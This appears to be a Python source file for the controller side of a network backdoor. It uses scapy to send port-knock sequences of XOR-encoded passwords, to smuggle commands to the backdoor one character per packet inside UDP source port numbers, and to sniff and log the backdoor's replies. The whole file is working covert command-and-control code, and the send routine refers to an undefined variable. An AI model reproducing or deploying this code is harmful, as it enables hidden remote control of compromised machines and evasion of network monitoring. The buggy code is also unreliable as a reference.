import logging
# Suppress annoying scapy warning about IPV6
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import*
from client_utils import*


# --------------------------------------------------------------------------------------------------------------------
#   FUNCTION:       sniff_packets - will sniff udp packets originating from the backdoor.
#
#   INTERFACE:      sniff_packets(packet_filter)
#                   packet_filter:   The filter to check incoming packets against. Every packet that matches the
#                       filter will be sent to the process_packet function.
#
#   RETURNS:
#
#   LAST MODIFIED:  November 27, 2014
#
#   DESIGNERS:	    Slade Solobay & Zach Smoroden
#
#   PROGRAMMERS:    Slade Solobay & Zach Smoroden
#
#   NOTES:
#                   This function is blocking and must be run in a separate process or thread.
#
# --------------------------------------------------------------------------------------------------------------------
def sniff_packets(packet_filter):
    sniff(filter=packet_filter, prn=process_packet)
    return


# --------------------------------------------------------------------------------------------------------------------
#   FUNCTION:       process_packet - Process inbound packets; checks knock sequence and writes packet data to file.
#
#   INTERFACE:      process_packet(data)
#                   data:   The packet data to be processed.
#
#   RETURNS:
#
#   LAST MODIFIED:  November 27, 2014
#
#   DESIGNERS:	    Slade Solobay & Zach Smoroden
#
#   PROGRAMMERS:    Slade Solobay & Zach Smoroden
#
#   NOTES:
#                   Function is called by sniff_packets and processes packets individually.
#
# --------------------------------------------------------------------------------------------------------------------
def process_packet(data):
    global KNOCKSEQUENCE
    global PACKET_LEN
    global PACKETS_RCVD

    try:
        # Ensure we have received a full knock from backdoor
        if KNOCKSEQUENCE != 5:
            print "check knock\n"
            knock(data, "receive")
        else:
            print PACKET_LEN
            # If first packet after knock, grab the number of inbound packets following
            if PACKET_LEN == 0:
                PACKET_LEN = data[0][2].sport
                print "Packet len: ", PACKET_LEN
            elif PACKETS_RCVD < PACKET_LEN-2:
                # Write data to file
                with open(FILENAME, 'a') as f:
                    f.write(xor_crypt(data.load) + "\n")
                PACKETS_RCVD += 1
            else:
                with open(FILENAME, 'a') as f:
                    f.write(xor_crypt(data.load) + "\n")
                    f.write("\n--------------END TRANSMISSION--------------\n\n")
                # Lock printing of responses to file, knock sequence expired. Must receive a new knock sequence.
                KNOCKSEQUENCE = 0
                # Reset packet counter and packets received counter
                PACKETS_RCVD = 0
                PACKET_LEN = 0
    except Exception as ex:
        print ex.message
    return


# --------------------------------------------------------------------------------------------------------------------
#   FUNCTION:       send_packet - Will send a command, via a covert channel, using UDP to the backdoor.
#
#   INTERFACE:      send_packet(data)
#                   data:   The packet data to be sent.
#
#   RETURNS:
#
#   LAST MODIFIED:  November 27, 2014
#
#   DESIGNERS:	    Slade Solobay & Zach Smoroden
#
#   PROGRAMMERS:    Slade Solobay & Zach Smoroden
#
#   NOTES:
#
#
# --------------------------------------------------------------------------------------------------------------------
def send_packet(data):
    knock(data, "send")
    # send the length of the command to the backdoor within the UDP source port
    send(IP(dst=data['dest']) / UDP(sport=len(data['cmd']), dport=int(packet['dport'])), verbose=0)
    # send the command covertly within the UDP source port
    for c in packet['cmd']:
        send(IP(dst=data['dest']) / UDP(sport=ord(c), dport=int(packet['dport'])), verbose=0)
    return


# --------------------------------------------------------------------------------------------------------------------
#   FUNCTION:       knock - A knock utility function; can check or send a knock sequence against a config file
#
#   INTERFACE:      knock(data, mode)
#                   data:   The packet data used to send knock to backdoor.
#                   mode:   Used to determine whether a knock is being sent or received (used 'send' and 'receive'
#                        respectively
#   RETURNS:
#
#   LAST MODIFIED:  November 27, 2014
#
#   DESIGNERS:	    Slade Solobay & Zach Smoroden
#
#   PROGRAMMERS:    Slade Solobay & Zach Smoroden
#
#   NOTES:
#          config file must be titled port_conf and place in the project root directory. A new
#
# --------------------------------------------------------------------------------------------------------------------
def knock(data, mode):
    global KNOCKSEQUENCE
    # Open file as file object and read to string
    ifile = open("port_conf", 'r')
    # Read file object to string
    text = ifile.read()
    # Close file object
    ifile.close()

    # Pull ports to match from config file
    port_regex = re.compile(r'\d{1,5}(?=:)')
    # Pull passwords to match from config file
    password_regex = re.compile(r'(?<=:)\S{4}')
    ports = port_regex.findall(text)
    passwords = password_regex.findall(text)
    if mode == "send":
        # Count used with password list to match appropriate port
        count = 0
        for port in ports:
            # send the port/password combo knock
            send(IP(dst=data['dest']) / UDP(sport=int(data['sport']), dport=int(port)) / xor_crypt(passwords[count]), verbose=0)
            count += 1
    if mode == "receive":
        for port in ports:
            print KNOCKSEQUENCE
            # If we get a valid port and password/port combo increment to check next password/port combo until 5
            if int(data[0][2].dport) == (int(port) + 10) and xor_crypt(data.load) == passwords[KNOCKSEQUENCE]:
                KNOCKSEQUENCE += 1
    return
